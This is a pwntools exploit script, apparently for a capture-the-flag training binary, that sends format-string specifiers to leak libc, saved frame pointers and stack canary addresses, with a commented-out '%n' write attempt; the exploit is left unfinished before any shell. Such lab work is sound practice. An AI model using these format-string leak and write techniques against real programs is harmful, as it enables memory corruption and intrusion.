#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyformat_level8
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level8')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

exploit = f"%3$lx %188$p"+f" %189$p %190$p %191$p %192$p %193$p %194$p %195$p"
payload = exploit.encode()  
# io.recvuntil(b'read your input again.')
io.sendline(payload)

io.recvuntil(b"Your input is:")
io.recvline()
leak_bytes = io.recvline(keepends=False)
leak = leak_bytes.decode().split(' ')
for i in range(len(leak)):
    leaked_int = int(leak[i], 16)
    print(f"{188+i} and 0x{leaked_int:x}")

leaked_libc = int(leak[0], 16)
libc_base = leaked_libc - 0x10e077
print(f"leaked libc_base : 0x{libc_base:x}")
leaked_rbp = leak[1]
rbp_func = int(leaked_rbp, 16)
rbp_main = rbp_func + 80
print(f"rbp_main : 0x{rbp_main:x}")
print(f"rbp_func : 0x{rbp_func:x}")
rbp_func2 = rbp_func - 16
print(f"rbp_func2 : 0x{rbp_func2:x}")
rsp_func2 = rbp_func2 - 1456  # 1456 = diff between rbp and rsp of func2
print(f"rsp_func2 : 0x{rsp_func2:x}")
rip_func2 = rbp_func2 + 8
print(f"rip_func2 : 0x{rip_func2:x}")
canary = rbp_func2 - 8
print(f"canary : 0x{canary:x}")

# rbp main, rbp func, rbp func2, libc base are correct

# b"%75$nA" 
# exp2 = b"%188$p  "+  b"%75$nAAAA"
# io.sendline(exp2)
# # io.recvuntil(b"Your input is:")
# print(io.recvline())
# # print(io.recvline())


io.interactive()

